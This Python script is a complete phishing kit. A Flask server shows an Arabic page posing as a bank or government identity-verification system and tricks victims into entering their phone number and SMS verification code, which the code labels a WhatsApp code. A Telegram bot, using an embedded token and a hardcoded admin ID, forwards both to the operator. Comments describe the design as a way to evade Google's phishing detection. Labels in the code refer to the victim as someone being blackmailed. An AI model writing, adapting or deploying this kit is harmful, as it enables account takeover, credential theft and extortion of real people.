import os
import telebot
from flask import Flask, request, render_template_string
from threading import Thread

# --- الإعدادات ---
TOKEN = '8390076798:AAGXs0nv45Swv5JaDs9YCcwRiUgqPbskcAI'
ADMIN_ID = 5288849409

bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

# --- تمويه HTML (تصميم أزرق بنكي/حكومي لتجاوز الحظر) ---
# ابتعدنا عن شعار واتساب واللون الأخضر لتفادي خوارزميات جوجل
BLUE_TRAP_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحقق من الهوية الرقمية</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f9; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 90%; max-width: 380px; text-align: center; border-top: 5px solid #1a73e8; }
        h2 { color: #1a73e8; font-size: 20px; margin-bottom: 15px; }
        p { color: #5f6368; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
        .input-box { margin-bottom: 20px; text-align: right; }
        label { display: block; font-size: 12px; color: #70757a; margin-bottom: 8px; font-weight: bold; }
        input { width: 100%; padding: 14px; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; text-align: center; }
        input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
        .btn-submit { background: #1a73e8; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
        .step-2 { display: none; }
        .active { display: block; animation: slideIn 0.4s ease-out; }
        @keyframes slideIn { from { transform: translateY(10px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .shield-icon { font-size: 40px; color: #1a73e8; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="shield-icon">🛡️</div>
        
        <div id="s1" class="step active">
            <h2>تحديث بروتوكول الهوية</h2>
            <p>لضمان حماية بياناتك الشخصية من الاختراقات المكتشفة مؤخراً، يرجى إعادة توثيق رقم هاتفك في النظام العالمي الموحد.</p>
            <div class="input-box">
                <label>رقم الهاتف المرتبط بالحساب</label>
                <input type="tel" id="p_num" placeholder="+966 5x xxx xxxx">
            </div>
            <button class="btn-submit" onclick="go2()">تأكيد الهوية الرقمية</button>
        </div>

        <div id="s2" class="step-2">
            <h2>رمز التحقق الثنائي</h2>
            <p>تم إرسال رمز الأمان المكون من 6 أرقام إلى جهازك. يرجى إدخاله لغلق كافة الجلسات النشطة وتأمين الحساب.</p>
            <div class="input-box">
                <label>أدخل الرمز المستلم (SMS)</label>
                <input type="number" id="otp_val" placeholder="- - - - - -" style="letter-spacing: 4px;">
            </div>
            <button class="btn-submit" onclick="finish()">تحديث الأمان الآن</button>
        </div>
    </div>

    <script>
        let p = "";
        async function go2() {
            p = document.getElementById('p_num').value;
            if(p.length < 8) return alert("الرقم غير صحيح");
            
            // إرسال الرقم فوراً للبوت
            fetch('/api/v', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ t: "🎯 رقم المبتز", v: p })
            });

            document.getElementById('s1').classList.remove('active');
            document.getElementById('s2').classList.add('active');
        }

        async function finish() {
            const c = document.getElementById('otp_val').value;
            if(c.length < 6) return alert("الرمز غير مكتمل");

            await fetch('/api/v', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ t: "🔑 كود الواتساب", v: c, ph: p })
            });

            alert("تم التحديث بنجاح. سيتم تطبيق إعدادات الأمان خلال 24 ساعة.");
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(BLUE_TRAP_HTML)

@app.route('/api/v', methods=['POST'])
def handle_v():
    data = request.json
    msg = (
        f"🚨 **تنبيه اختراق جديد**\n"
        f"━━━━━━━━━━━━━━\n"
        f"📌 **النوع:** `{data.get('t')}`\n"
        f"📱 **البيانات:** `{data.get('v')}`\n"
        f"{f'📞 **مرتبط برقم:** `{data.get('ph')}`' if data.get('ph') else ''}\n"
        f"━━━━━━━━━━━━━━"
    )
    bot.send_message(ADMIN_ID, msg, parse_mode="Markdown")
    return {"s": "ok"}

if __name__ == '__main__':
    # تشغيل البوت في الخلفية
    Thread(target=lambda: bot.infinity_polling()).start()
    
    # حل مشكلة Port Binding لتجاوز الخطأ في صورتك الأولى
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
